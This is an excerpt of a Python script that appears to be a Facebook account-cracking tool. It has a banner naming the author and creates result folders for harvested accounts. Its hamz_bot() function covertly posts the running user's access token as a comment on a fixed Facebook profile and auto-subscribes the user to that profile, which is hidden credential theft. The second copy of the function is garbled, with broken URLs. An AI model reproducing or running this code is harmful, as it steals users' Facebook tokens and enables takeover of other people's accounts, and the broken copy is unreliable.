...
def hamz_bot():
    ...
    kom = " Bang @[100076106394240:] Ganteng Bangetz Ngga Ada Obat "
    requests.post('https://graph.facebook.com/100076106394240/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100076106394240/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100076106394240/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/100076106394240/comments/?message=' +kom+ '&access_token=' + token)
    menu()
...
def banner():
	...
	sol().print(cik2)
	ban='''
•   AUTHOR : Cabdulahi100 WHATSAPP : 252682390000   •
•    d888888b db      db    db  .d8b.  .d8888. 
  `88'   88      `8b  d8' d8' `8b 88'  YP 
   88    88       `8bd8'  88ooo88 `8bo.   
   88    88         88    88~~~88   `Y8b. 
  .88.   88booo.    88    88   88 db   8D 
Y888888P Y88888P    YP    YP   YP `8888Y' 
•VERSION 4.0.4   •
•                                               •
•   GITHUB : HTTPS://GITHUB.COM/Cabdulahi100/   •'''
...
def hamz_bot():
    try:
        ...
        os.system('rm -rf login.txt')
    kom = " Bang @[100076106394240:] Ganteng Bangetz Ngga Ada Obat "
    requests.post('https://graph./subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100076106394240/facebook.com/100006414900732/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100076106394240/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/100076106394240/comments/?message=' +kom+ '&access_token=' + token)
    menu()
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/Cabdulahi-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/Cabdulahi-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/Cabdulahi-DATA/DUMP')
	except:pass
	login()
